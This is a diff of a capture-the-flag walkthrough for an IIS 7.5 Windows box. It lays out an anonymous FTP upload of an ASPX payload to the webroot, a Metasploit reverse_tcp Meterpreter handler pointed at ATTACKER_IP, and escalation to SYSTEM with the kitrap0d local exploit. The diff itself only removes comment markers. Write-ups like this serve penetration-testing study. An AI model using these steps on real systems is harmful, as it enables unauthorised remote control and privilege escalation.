@@ -55,9 +55,9 @@ HTTP (80) — Microsoft-IIS/7.5 (IIS7)
 2) Confirm anonymous FTP and list files
 
 ftp TARGET_IP
-# username: anonymous
-# password: (blank)
-# ls
+ username: anonymous
+ password: (blank)
+ ls
 
 Noted aspnet_client/ (empty), iisstart.htm, and welcome.png — nothing immediately interesting in pages, but anonymous write/upload was possible.
 
@@ -70,9 +70,9 @@ Notes: On restricted networks, ports <1024 may require privileges — choose a p
 4) Upload the ASPX to the webroot via anonymous FTP
 
 ftp TARGET_IP
-# login as anonymous
+ login as anonymous
 put devel.aspx
-# confirm the file is present (e.g., in IIS webroot)
+ confirm the file is present (e.g., in IIS webroot)
 
 If the FTP root maps to the IIS webroot, the uploaded devel.aspx becomes web-accessible (e.g., http://TARGET_IP/devel.aspx).
 
@@ -80,7 +80,7 @@ If the FTP root maps to the IIS webroot, the uploaded devel.aspx becomes web-acc
 
 Start a handler on your attacking host (msfconsole example):
 
-# In msfconsole
+ In msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST ATTACKER_IP
@@ -92,9 +92,9 @@ Trigger the webshell by browsing to the uploaded ASPX (or curl http://TARGET_IP/
 
 6) Interact with the Meterpreter session
 
-# In msfconsole
+ In msfconsole
 sessions -i <id>
-# Meterpreter prompt
+ Meterpreter prompt
 sysinfo # confirm OS and architecture (Observed x86)
 pwd # observed /windows/system32/inetsrv
 
@@ -116,7 +116,7 @@ This returns a prioritized list of local exploits that may work on the target gi
 
 Using msfconsole I executed the exploit against the Meterpreter session:
 
-# in msfconsole
+ in msfconsole
 use exploit/windows/local/ms10_015_kitrap0d
 set SESSION <meterpreter-session-id>
 set LHOST ATTACKER_IP
@@ -130,10 +130,10 @@ Important: choose a local exploit appropriate to the discovered OS, arch, and pa
 
 10) Verify SYSTEM and capture flags
 
-# switch to the new session (e.g., session 4)
+ switch to the new session (e.g., session 4)
 sessions -i <new-session-id>
 getuid # shows NT AUTHORITY\SYSTEM
-# then retrieve flags
+ then retrieve flags
 cd C:\Users\<user>\Desktop
 type user.txt
 cd C:\Users\Administrator\Desktop
